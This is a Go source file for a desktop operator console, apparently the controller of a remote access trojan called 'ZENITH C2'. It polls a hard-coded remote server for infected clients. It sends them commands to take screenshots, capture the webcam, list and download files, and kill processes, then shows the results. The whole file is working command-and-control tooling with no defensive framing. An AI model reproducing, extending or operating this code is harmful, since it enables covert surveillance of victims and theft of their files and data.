package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

// --- Конфигурация ---
const (
	VPS_URL    = "http://45.76.76.74:43445"
	ADMIN_PASS = "MY_ADMIN_PASSWORD"
)

type ClientInfo struct {
	Name     string  `json:"name"`
	Status   string  `json:"status"`
	Result   string  `json:"result"`
	Task     string  `json:"task"`
	LastSeen float64 `json:"last_seen"`
}

var (
	selectedCID string
	clients     map[string]ClientInfo
)

func main() {
	myApp := app.New()
	myWindow := myApp.NewWindow("ZENITH C2 - GO EDITION")
	myWindow.Resize(fyne.NewSize(1200, 800))

	// Элементы интерфейса
	terminal := widget.NewMultiLineEntry()
	terminal.TextStyle = fyne.TextStyle{Monospace: true}

	clientListContainer := container.NewVBox()

	imageViewer := canvas.NewImageFromResource(nil)
	imageViewer.FillMode = canvas.ImageFillContain

	// Функция отправки команды
	sendCommand := func(cmd string) {
		if selectedCID == "" {
			terminal.Append("\n[!] Ошибка: Клиент не выбран!")
			return
		}
		data, _ := json.Marshal(map[string]string{"cid": selectedCID, "cmd": cmd})
		req, _ := http.NewRequest("POST", VPS_URL+"/admin/push", bytes.NewBuffer(data))
		req.Header.Set("Admin-Auth", ADMIN_PASS)
		req.Header.Set("Content-Type", "application/json")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == 200 {
			terminal.Append(fmt.Sprintf("\n[SENT] -> %s", cmd))
		}
		defer resp.Body.Close()
	}

	// Правая панель кнопок
	btnScreenshot := widget.NewButton("📸 SCREENSHOT", func() { sendCommand("screenshot") })
	btnWebcam := widget.NewButton("📷 WEBCAM", func() { sendCommand("webcam") })

	pathEntry := widget.NewEntry()
	pathEntry.SetPlaceHolder("C:\\")
	btnLS := widget.NewButton("📂 LIST DIR (LS)", func() { sendCommand("ls " + pathEntry.Text) })
	btnDownload := widget.NewButton("📥 DOWNLOAD", func() { sendCommand("download " + pathEntry.Text) })

	pidEntry := widget.NewEntry()
	pidEntry.SetPlaceHolder("PID")
	btnKill := widget.NewButton("💀 KILL PID", func() { sendCommand("kill " + pidEntry.Text) })

	rightPanel := container.NewVBox(
		widget.NewLabel("БЫСТРЫЕ КОМАНДЫ"),
		btnScreenshot, btnWebcam,
		widget.NewSeparator(),
		widget.NewLabel("ФАЙЛЫ"),
		pathEntry, btnLS, btnDownload,
		widget.NewSeparator(),
		widget.NewLabel("ПРОЦЕССЫ"),
		pidEntry, btnKill,
	)

	// Вкладки (Tabs)
	tabs := container.NewAppTabs(
		container.NewTabItem("Терминал", terminal),
		container.NewTabItem("Медиа", container.New(layout.NewMaxLayout(), imageViewer)),
	)

	// Основная сетка (Sidebar | Tabs | Buttons)
	content := container.NewHSplit(
		container.NewVScroll(clientListContainer),
		container.NewHSplit(tabs, rightPanel),
	)
	content.Offset = 0.2

	myWindow.SetContent(content)

	// Цикл обновления данных
	go func() {
		lastRes := ""
		for {
			req, _ := http.NewRequest("GET", VPS_URL+"/admin/list", nil)
			req.Header.Set("Admin-Auth", ADMIN_PASS)

			client := &http.Client{Timeout: 5 * time.Second}
			resp, err := client.Do(req)
			if err == nil {
				json.NewDecoder(resp.Body).Decode(&clients)
				resp.Body.Close()

				clientListContainer.Objects = nil
				for id, info := range clients {
					cid := id // локальная копия для closure
					statusText := fmt.Sprintf("%s\n[%s]", info.Name, info.Status)
					btn := widget.NewButton(statusText, func() {
						selectedCID = cid
						terminal.Append(fmt.Sprintf("\n[*] Выбран клиент: %s", cid))
					})
					clientListContainer.Add(btn)

					// Проверка новых результатов
					if cid == selectedCID && info.Result != lastRes {
						if len(info.Result) > 11 && info.Result[:11] == "IMAGE_PATH:" {
							// Логика загрузки фото (упрощенно)
							terminal.Append("\n[+] Новое изображение получено. См. вкладку Медиа.")
						} else {
							terminal.Append("\n" + info.Result)
						}
						lastRes = info.Result
					}
				}
				clientListContainer.Refresh()
			}
			time.Sleep(5 * time.Second)
		}
	}()

	myWindow.ShowAndRun()
}
